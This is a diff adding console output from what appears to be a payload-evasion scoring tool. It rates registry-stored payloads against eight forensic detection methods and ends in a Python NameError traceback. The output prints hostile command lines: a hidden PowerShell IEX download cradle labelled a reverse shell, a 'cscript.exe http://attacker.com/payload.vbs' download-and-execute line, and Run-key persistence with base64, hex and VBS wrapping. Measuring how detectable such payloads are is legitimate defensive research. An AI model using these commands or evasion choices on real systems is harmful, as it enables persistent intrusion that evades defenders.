@@ -1,0 +1,445 @@
+[*] Running Forensic Registry Storage Analysis
+[*] Testing payload detection difficulty against forensic tools
+
+
+[*] Analyzing: PowerShell Command Execution
+
+[*] Analyzing: CMD Reverse Shell
+
+[*] Analyzing: VBScript Download and Execute
+
+[*] Analyzing: Long Obfuscated Payload
+
+[*] Generating forensic reports...
+
+
+================================================================================
+Test Case: PowerShell Command Execution
+================================================================================
+================================================================================
+                   FORENSIC REGISTRY STORAGE ANALYSIS REPORT                    
+================================================================================
+
+Report Generated: 2026-06-29T17:21:24.762793
+
+                              PAYLOAD INFORMATION                               
+--------------------------------------------------------------------------------
+Payload:              powershell.exe -Command "Write-Host 'System Update'"
+Payload Hash (SHA256): c3c7dd4f79c1a3e905a42ca5fe85ea738b3e4070fc5f12bc6c6285a5c6eec4b4
+Encoding Method:      BASE64
+Registry Hive:        HKLM
+Registry Path:        Software\Microsoft\Windows\CurrentVersion\Run
+
+                                 SIZE ANALYSIS                                  
+--------------------------------------------------------------------------------
+Original Payload Size:     52 bytes
+Encoded Payload Size:      72 bytes
+Encoding Overhead:        +20 bytes (38.5%)
+VBS Code Size:            551 bytes
+Total Storage Requirement: 623 bytes
+
+                        DETECTION DIFFICULTY ASSESSMENT                         
+--------------------------------------------------------------------------------
+Overall Detection Difficulty: DIFFICULT to detect
+Difficulty Score: 0.65/1.00
+
+Interpretation:
+- Scores closer to 1.0 indicate HARDER detection (better evasion)
+- Scores closer to 0.0 indicate EASIER detection (weaker evasion)
+
+                          EVASION TECHNIQUES EMPLOYED                           
+--------------------------------------------------------------------------------
+  1. base64_encoding
+  2. registry_obfuscation
+  3. vbs_wrapper
+
+                          FORENSIC DETECTION ANALYSIS                           
+--------------------------------------------------------------------------------
+Methods Analyzed: 8
+Methods with Positive Detections: 4
+
+
+[✓ DETECTED] Pattern Signature
+  Confidence Level: LOW (0.38)
+  Detection Difficulty: DIFFICULT to detect (0.62)
+  Evidence: Matched 3 suspicious patterns: powershell, vbscript_exec, system_commands
+
+[✗ NOT DETECTED] Entropy Analysis
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (0.80)
+  Evidence: Payload entropy: -0.23, Encoded entropy: -0.19
+  Fragment: Entropy ratio: -1.89x
+
+[✓ DETECTED] Base64 Detection
+  Confidence Level: VERY HIGH (1.00)
+  Detection Difficulty: VERY EASY to detect (0.10)
+  Evidence: Valid base64: True, Has padding: True, Decodable: True
+  Fragment: cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgIldyaXRlLUhvc3QgJ1
+
+[✗ NOT DETECTED] Hex Sequence Detection
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Encoding method is not hex
+
+[✓ DETECTED] Registry Path Analysis
+  Confidence Level: LOW (0.37)
+  Detection Difficulty: DIFFICULT to detect (0.63)
+  Evidence: Registry path: Software\Microsoft\Windows\CurrentVersion\Run (Hive: HKLM). Suspicious types matched: Run
+
+[✗ NOT DETECTED] Value Size Anomaly
+  Confidence Level: VERY LOW (0.10)
+  Detection Difficulty: VERY DIFFICULT to detect (0.95)
+  Evidence: Payload size: 52 bytes, Encoded size: 72 bytes (ratio: 1.38)
+  Fragment: 72 bytes
+
+[✗ NOT DETECTED] String Extraction
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Payload in code: False, Fragment matches: 0/5
+
+[✓ DETECTED] Encoding Fingerprint
+  Confidence Level: HIGH (0.80)
+  Detection Difficulty: VERY EASY to detect (0.10)
+  Evidence: Base64 alphabet present: True, Padding: True
+
+================================================================================
+                        
+FORENSIC INVESTIGATION SUMMARY                         
+--------------------------------------------------------------------------------
+
+WARNING: Payload is detectable using 4 forensic method(s):
+  • Pattern Signature
+  • Base64 Detection
+  • Registry Path Analysis
+  • Encoding Fingerprint
+
+================================================================================
+
+[+] Reports saved for: PowerShell Command Execution
+
+================================================================================
+Test Case: CMD Reverse Shell
+================================================================================
+================================================================================
+                   FORENSIC REGISTRY STORAGE ANALYSIS REPORT                    
+================================================================================
+
+Report Generated: 2026-06-29T17:21:24.763352
+
+                              PAYLOAD INFORMATION                               
+--------------------------------------------------------------------------------
+Payload:              cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClie...
+Payload Hash (SHA256): d5d6803d227ee27724a9ac54ef820000e5155d8999898b5bf2c491c4ed1ecf13
+Encoding Method:      HEX
+Registry Hive:        HKCU
+Registry Path:        Software\Microsoft\Windows\CurrentVersion\Run
+
+                                 SIZE ANALYSIS                                  
+--------------------------------------------------------------------------------
+Original Payload Size:     117 bytes
+Encoded Payload Size:      234 bytes
+Encoding Overhead:        +117 bytes (100.0%)
+VBS Code Size:            712 bytes
+Total Storage Requirement: 946 bytes
+
+                        DETECTION DIFFICULTY ASSESSMENT                         
+--------------------------------------------------------------------------------
+Overall Detection Difficulty: DIFFICULT to detect
+Difficulty Score: 0.66/1.00
+
+Interpretation:
+- Scores closer to 1.0 indicate HARDER detection (better evasion)
+- Scores closer to 0.0 indicate EASIER detection (weaker evasion)
+
+                          EVASION TECHNIQUES EMPLOYED                           
+--------------------------------------------------------------------------------
+  1. hex_encoding
+  2. registry_obfuscation
+  3. vbs_wrapper
+
+                          FORENSIC DETECTION ANALYSIS                           
+--------------------------------------------------------------------------------
+Methods Analyzed: 8
+Methods with Positive Detections: 4
+
+
+[✓ DETECTED] Pattern Signature
+  Confidence Level: MODERATE (0.62)
+  Detection Difficulty: EASY to detect (0.38)
+  Evidence: Matched 5 suspicious patterns: powershell, cmd_exec, vbscript_exec, url_download, system_commands
+
+[✗ NOT DETECTED] Entropy Analysis
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (0.80)
+  Evidence: Payload entropy: -0.20, Encoded entropy: -0.33
+  Fragment: Entropy ratio: -3.26x
+
+[✗ NOT DETECTED] Base64 Detection
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Encoding method is not base64
+
+[✓ DETECTED] Hex Sequence Detection
+  Confidence Level: VERY HIGH (1.00)
+  Detection Difficulty: EASY to detect (0.20)
+  Evidence: Valid hex: True, Decodable: True
+  Fragment: 636d642e657865202f6320706f7765727368656c6c2e657865
+
+[✓ DETECTED] Registry Path Analysis
+  Confidence Level: VERY LOW (0.17)
+  Detection Difficulty: VERY DIFFICULT to detect (0.83)
+  Evidence: Registry path: Software\Microsoft\Windows\CurrentVersion\Run (Hive: HKCU). Suspicious types matched: Run
+
+[✗ NOT DETECTED] Value Size Anomaly
+  Confidence Level: VERY LOW (0.10)
+  Detection Difficulty: VERY DIFFICULT to detect (0.95)
+  Evidence: Payload size: 117 bytes, Encoded size: 234 bytes (ratio: 2.00)
+  Fragment: 234 bytes
+
+[✗ NOT DETECTED] String Extraction
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Payload in code: False, Fragment matches: 0/9
+
+[✓ DETECTED] Encoding Fingerprint
+  Confidence Level: HIGH (0.85)
+  Detection Difficulty: VERY EASY to detect (0.10)
+  Evidence: Hex alphabet present: True, No B64-only chars: True
+
+================================================================================
+                        
+FORENSIC INVESTIGATION SUMMARY                         
+--------------------------------------------------------------------------------
+
+WARNING: Payload is detectable using 4 forensic method(s):
+  • Pattern Signature
+  • Hex Sequence Detection
+  • Registry Path Analysis
+  • Encoding Fingerprint
+
+================================================================================
+
+[+] Reports saved for: CMD Reverse Shell
+
+================================================================================
+Test Case: VBScript Download and Execute
+================================================================================
+================================================================================
+                   FORENSIC REGISTRY STORAGE ANALYSIS REPORT                    
+================================================================================
+
+Report Generated: 2026-06-29T17:21:24.763620
+
+                              PAYLOAD INFORMATION                               
+--------------------------------------------------------------------------------
+Payload:              cscript.exe http://attacker.com/payload.vbs
+Payload Hash (SHA256): df7348f3a6fdcfacff63c53204e44e162f9375f727d2d2ca56fcfb4792b311ea
+Encoding Method:      BASE64
+Registry Hive:        HKCU
+Registry Path:        Software\Test\Update
+
+                                 SIZE ANALYSIS                                  
+--------------------------------------------------------------------------------
+Original Payload Size:     43 bytes
+Encoded Payload Size:      60 bytes
+Encoding Overhead:        +17 bytes (39.5%)
+VBS Code Size:            513 bytes
+Total Storage Requirement: 573 bytes
+
+                        DETECTION DIFFICULTY ASSESSMENT                         
+--------------------------------------------------------------------------------
+Overall Detection Difficulty: DIFFICULT to detect
+Difficulty Score: 0.70/1.00
+
+Interpretation:
+- Scores closer to 1.0 indicate HARDER detection (better evasion)
+- Scores closer to 0.0 indicate EASIER detection (weaker evasion)
+
+                          EVASION TECHNIQUES EMPLOYED                           
+--------------------------------------------------------------------------------
+  1. base64_encoding
+  2. registry_obfuscation
+  3. vbs_wrapper
+
+                          FORENSIC DETECTION ANALYSIS                           
+--------------------------------------------------------------------------------
+Methods Analyzed: 8
+Methods with Positive Detections: 3
+
+
+[✓ DETECTED] Pattern Signature
+  Confidence Level: LOW (0.38)
+  Detection Difficulty: DIFFICULT to detect (0.62)
+  Evidence: Matched 3 suspicious patterns: vbscript_exec, url_download, system_commands
+
+[✗ NOT DETECTED] Entropy Analysis
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (0.80)
+  Evidence: Payload entropy: -0.24, Encoded entropy: -0.18
+  Fragment: Entropy ratio: -1.77x
+
+[✓ DETECTED] Base64 Detection
+  Confidence Level: VERY HIGH (1.00)
+  Detection Difficulty: VERY EASY to detect (0.10)
+  Evidence: Valid base64: True, Has padding: True, Decodable: True
+  Fragment: Y3NjcmlwdC5leGUgaHR0cDovL2F0dGFja2VyLmNvbS9wYXlsb2
+
+[✗ NOT DETECTED] Hex Sequence Detection
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Encoding method is not hex
+
+[✗ NOT DETECTED] Registry Path Analysis
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Registry path: Software\Test\Update (Hive: HKCU)
+
+[✗ NOT DETECTED] Value Size Anomaly
+  Confidence Level: VERY LOW (0.10)
+  Detection Difficulty: VERY DIFFICULT to detect (0.95)
+  Evidence: Payload size: 43 bytes, Encoded size: 60 bytes (ratio: 1.40)
+  Fragment: 60 bytes
+
+[✗ NOT DETECTED] String Extraction
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Payload in code: False, Fragment matches: 0/2
+
+[✓ DETECTED] Encoding Fingerprint
+  Confidence Level: HIGH (0.80)
+  Detection Difficulty: VERY EASY to detect (0.10)
+  Evidence: Base64 alphabet present: True, Padding: True
+
+================================================================================
+                        
+FORENSIC INVESTIGATION SUMMARY                         
+--------------------------------------------------------------------------------
+
+WARNING: Payload is detectable using 3 forensic method(s):
+  • Pattern Signature
+  • Base64 Detection
+  • Encoding Fingerprint
+
+================================================================================
+
+[+] Reports saved for: VBScript Download and Execute
+
+================================================================================
+Test Case: Long Obfuscated Payload
+================================================================================
+================================================================================
+                   FORENSIC REGISTRY STORAGE ANALYSIS REPORT                    
+================================================================================
+
+Report Generated: 2026-06-29T17:21:24.763847
+
+                              PAYLOAD INFORMATION                               
+--------------------------------------------------------------------------------
+Payload:              powershell.exe -nop -nop -nop -nop -nop -nop -nop -nop -nop -nop -nop ...
+Payload Hash (SHA256): 314b5ca481037dff7ccddc7900c3bcd3e53983ba8f12c650dd6d4b02ce918ee3
+Encoding Method:      HEX
+Registry Hive:        HKCU
+Registry Path:        Software\Microsoft\Windows
+
+                                 SIZE ANALYSIS                                  
+--------------------------------------------------------------------------------
+Original Payload Size:     278 bytes
+Encoded Payload Size:      556 bytes
+Encoding Overhead:        +278 bytes (100.0%)
+VBS Code Size:            1,015 bytes
+Total Storage Requirement: 1,571 bytes
+
+                        DETECTION DIFFICULTY ASSESSMENT                         
+--------------------------------------------------------------------------------
+Overall Detection Difficulty: DIFFICULT to detect
+Difficulty Score: 0.71/1.00
+
+Interpretation:
+- Scores closer to 1.0 indicate HARDER detection (better evasion)
+- Scores closer to 0.0 indicate EASIER detection (weaker evasion)
+
+                          EVASION TECHNIQUES EMPLOYED                           
+--------------------------------------------------------------------------------
+  1. hex_encoding
+  2. registry_obfuscation
+  3. vbs_wrapper
+
+                          FORENSIC DETECTION ANALYSIS                           
+--------------------------------------------------------------------------------
+Methods Analyzed: 8
+Methods with Positive Detections: 3
+
+
+[✓ DETECTED] Pattern Signature
+  Confidence Level: LOW (0.38)
+  Detection Difficulty: DIFFICULT to detect (0.62)
+  Evidence: Matched 3 suspicious patterns: powershell, vbscript_exec, system_commands
+
+[✗ NOT DETECTED] Entropy Analysis
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (0.80)
+  Evidence: Payload entropy: -0.40, Encoded entropy: -0.38
+  Fragment: Entropy ratio: -3.78x
+
+[✗ NOT DETECTED] Base64 Detection
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Encoding method is not base64
+
+[✓ DETECTED] Hex Sequence Detection
+  Confidence Level: VERY HIGH (1.00)
+  Detection Difficulty: EASY to detect (0.20)
+  Evidence: Valid hex: True, Decodable: True
+  Fragment: 706f7765727368656c6c2e657865202d6e6f70202d6e6f7020
+
+[✗ NOT DETECTED] Registry Path Analysis
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Registry path: Software\Microsoft\Windows (Hive: HKCU)
+
+[✗ NOT DETECTED] Value Size Anomaly
+  Confidence Level: VERY LOW (0.10)
+  Detection Difficulty: VERY DIFFICULT to detect (0.95)
+  Evidence: Payload size: 278 bytes, Encoded size: 556 bytes (ratio: 2.00)
+  Fragment: 556 bytes
+
+[✗ NOT DETECTED] String Extraction
+  Confidence Level: VERY LOW (0.00)
+  Detection Difficulty: VERY DIFFICULT to detect (1.00)
+  Evidence: Payload in code: False, Fragment matches: 0/53
+
+[✓ DETECTED] Encoding Fingerprint
+  Confidence Level: HIGH (0.85)
+  Detection Difficulty: VERY EASY to detect (0.10)
+  Evidence: Hex alphabet present: True, No B64-only chars: True
+
+================================================================================
+                        
+FORENSIC INVESTIGATION SUMMARY                         
+--------------------------------------------------------------------------------
+
+WARNING: Payload is detectable using 3 forensic method(s):
+  • Pattern Signature
+  • Hex Sequence Detection
+  • Encoding Fingerprint
+
+================================================================================
+
+[+] Reports saved for: Long Obfuscated Payload
+
+================================================================================
+                                ANALYSIS SUMMARY                                
+================================================================================
+
+Average Detection Difficulty: DIFFICULT to detect
+Average Difficulty Score: 0.68/1.00
+Average Detections per Payload: 3.5
+
+Total Test Cases: 4
+Traceback (most recent call last):
+  File "/home/user/sc-generator/generate_forensic_report.py", line 298, in <module>
+    main()
+  File "/home/user/sc-generator/generate_forensic_report.py", line 292, in main
+    print(f"Report files saved to: /tmp/forensic_report_*.{txt,json,csv}")
+                                                           ^^^
+NameError: name 'txt' is not defined
